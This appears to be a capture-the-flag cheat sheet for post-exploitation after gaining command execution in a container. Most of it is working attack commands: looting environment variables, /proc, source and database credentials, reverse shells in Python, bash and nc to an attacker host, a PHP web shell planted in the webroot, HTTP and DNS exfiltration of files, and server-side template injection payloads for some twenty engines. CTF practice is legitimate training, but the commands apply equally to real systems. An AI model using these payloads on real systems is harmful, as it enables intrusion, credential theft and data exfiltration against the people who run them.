# OS-level operations — what to run once exec lands

You've reached `os.system`/`exec`/`ProcessBuilder` — what now?
The recon-and-loot sequence for the container you just owned.

---

## 1. The first-commands — where am I

```bash
id                            # uid/gid — who's running
whoami; hostname; pwd          # user/host/dir
uname -a                       # kernel — container vs host
cat /etc/os-release            # distro
env                            # ALL env-vars — FLAG first
env | grep -i flag
ls -la                         # cwd contents
ls -la / /app /opt /srv        # app-dirs
cat /proc/self/cgroup          # container? k8s?
```

## 2. The flag-hunt — find it fast

```bash
find / -name '*flag*' -o -name '*FLAG*' 2>/dev/null
find / -name 'flag*' -type f 2>/dev/null
grep -rl 'flag{' /app /opt /srv /home /root /tmp 2>/dev/null
grep -rl 'FLAG' /app 2>/dev/null
cat /flag /flag.txt /app/flag /flag* 2>/dev/null
ls -la /app; cat /app/*.py /app/*.rb /app/*.php 2>/dev/null
cat /proc/self/environ | tr '\0' '\n'     # env via proc
cat /proc/1/environ | tr '\0' '\n'        # pid-1 env — the REAL env
cat /app/.env /app/config* 2>/dev/null
```

`/proc/1/environ` — PID-1's environment — the container env —
flag-vars often set at container-start, visible to all.

## 3. The source-read — secrets in code

```bash
find /app -name '*.py' -o -name '*.php' -o -name '*.rb' | xargs cat
cat /app/*.py 2>/dev/null | head -200
grep -rn 'flag\|secret\|key\|pass' /app 2>/dev/null
ls -la /app/templates /app/views /app/src 2>/dev/null
cat /app/.env /app/config.py /app/settings.py 2>/dev/null
cat /proc/self/cwd/../* 2>/dev/null    # parent-dir scan
```

`render_template_string` apps put the flag near the handler —
reading the source answers everything.

## 4. The network posture — what else is reachable

```bash
cat /etc/hosts /etc/resolv.conf            # other services
ip addr; ip route                           # interfaces/gateway
netstat -tlnp 2>/dev/null || ss -tlnp       # listening ports
arp -a 2>/dev/null                          # neighbors
curl http://127.0.0.1:PORT/                 # internal services
curl http://metadata/ 2>/dev/null           # cloud-metadata?
```

Internal-services — the DB/redis/admin-api — the flag may live
on a sibling you can only reach from inside.

## 5. The db reach — flag in a table

```bash
env | grep -i 'sql\|db\|mysql\|postgres\|mongo\|redis'
cat /app/*.py | grep -i 'connect\|dsn\|db'
mysql -u x -px -e 'show databases' 2>/dev/null
psql -U x -c '\l' 2>/dev/null
redis-cli keys '*' 2>/dev/null
mongo 2>/dev/null --eval 'db.adminCommand({listDatabases:1})'
find / -name '*.sqlite3' -o -name '*.db' 2>/dev/null
sqlite3 /app/app.db 'select * from flag'
```

Flat-file DBs (`*.db`/`*.sqlite3`) — `sqlite3` client may not be
installed — pull the FILE if you have read, parse offline with
`tools/forensics/sqlite_carve`/`sqlite_wal`.

## 6. The reverse-shell — when you want interactivity

```bash
# python:
python3 -c 'import socket,os,pty;s=socket.socket();s.connect(("YOU",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn("/bin/sh")'
# bash:
bash -i >& /dev/tcp/YOU/4444 0>&1
# nc:
nc -e /bin/sh YOU 4444          # or:
mkfifo f; cat f|sh -i 2>&1|nc YOU 4444 > f
```

In CTF, rarely needed — `os.popen(cmd).read()` per-command is
usually enough — but interactive beats one-shot for recon.

## 7. The write-channel — persist your read

```bash
cat /flag > /app/static/x.txt             # into served dir
cp /flag /var/www/html/f.txt              # then GET it
echo '<?php system($_GET[c]);?>' > /app/static/s.php  # shell
chmod 777 /app/static/x.txt
```

Write-to-webroot is THE blind-exfil — the GET fetches what exec
couldn't echo.

## 8. The container-breakout check — is this real RCE?

```bash
cat /proc/1/cgroup | grep -i 'docker\|kubepods\|containerd'
ls /.dockerenv 2>/dev/null                   # docker marker
mount | grep -i docker
cat /proc/self/status | grep -i cap          # capabilities
```

Usually you stop at "container-flag" — the challenge boundary.
If kernel/privesc needed — different skill (`ctf-pwn`).

## 9. The blind channel — when output never returns

```bash
# http-exfil:
curl http://YOU/?d=$(cat /flag | base64 | tr -d '\n')
curl -X POST http://YOU/ -d "$(cat /flag)"
wget -qO- "http://YOU/?d=$(cat /flag|base64|tr -d '\n')"
# dns-exfil:
dig $(cat /flag | xxd -p | head -c32).you.com
ping -c1 $(cat /flag | xxd -p | head -c32).you.com
nslookup $(cat /flag|base64|tr -d '\n'|head -c60).you.com
# write-to-file-then-http:
cat /flag | base64 > /tmp/x; curl --data @/tmp/x http://YOU/
```

`oob_listener` catches HTTP/DNS callbacks.

## 10. The per-engine exec cheatsheet

| Engine | Exec-one-liner |
|---|---|
| Jinja2 | `{{lipsum.__globals__.os.popen('CMD').read()}}` |
| Mako | `${__import__('os').popen('CMD').read()}` |
| Twig | `{{['CMD']\|map('system')}}` or `_self.env.registerUndefinedFilterCallback` |
| Smarty | `{php}system('CMD');{/php}` / `{if system('CMD')}{/if}` |
| FreeMarker | `${"freemarker.template.utility.Execute"?new()("CMD")}` |
| Velocity | `$x.class.forName('java.lang.Runtime').getRuntime().exec('CMD')` |
| Thymeleaf | `*{T(java.lang.Runtime).getRuntime().exec('CMD')}` |
| ERB | `<%=\`CMD\`%>` / `<%=%x(CMD)%>` / `<%=IO.popen('CMD').read%>` |
| EJS | `<%=global.process.mainModule.require('child_process').execSync('CMD').toString()%>` |
| Nunjucks | `{{range.constructor('return process.mainModule.require("child_process").execSync("CMD")')()}}` |
| Groovy | `${'CMD'.execute().text}` |
| Slim | `#{%x(CMD)}` / `#{IO.popen('CMD').read}` |
| Pug | `#{global.process.mainModule.require('child_process').execSync('CMD')}` |
| Pebble | `{{'a'.getClass().forName('java.lang.Runtime').getRuntime().exec('CMD')}}` |
| Jinjava | same as Pebble |
| OGNL | `%{@java.lang.Runtime@getRuntime().exec('CMD')}` |
| Blade | `@php(system('CMD'))@endphp` |
| Volt | `{{system('CMD')}}` |
| Latte | `{=system('CMD')}` |
| Razor | `@{System.Diagnostics.Process.Start("CMD")}` |
